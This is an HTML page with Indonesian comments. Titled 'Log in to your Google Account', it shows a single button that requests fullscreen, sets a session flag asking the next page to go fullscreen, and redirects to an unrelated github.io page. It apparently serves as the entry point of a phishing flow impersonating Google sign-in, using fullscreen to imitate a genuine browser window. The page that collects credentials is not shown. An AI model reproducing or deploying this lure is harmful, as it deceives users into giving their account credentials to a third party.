<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to your Google Account</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }
    .btn {
      background-color: #1a73e8;
      color: #ffffff;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .btn:hover {
      background-color: #1666cc;
    }
  </style>
</head>
<body>
  <button class="btn" id="loginBtn">Log in to your Google Account</button>

  <script>
    document.getElementById('loginBtn').addEventListener('click', function () {
      // Tandai bahwa user ingin masuk mode fullscreen di halaman berikutnya
      sessionStorage.setItem('wantFullscreen', '1');

      // (Opsional) Coba fullscreen di halaman ini dulu —
      // sebagian browser meneruskan status ini, sebagian tidak.
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen().catch(() => {});
      }

      // Pindah ke bar.html
      window.location.href = 'https://mwishal.github.io/bar/bar.html';
    });
  </script>
</body>
</html>
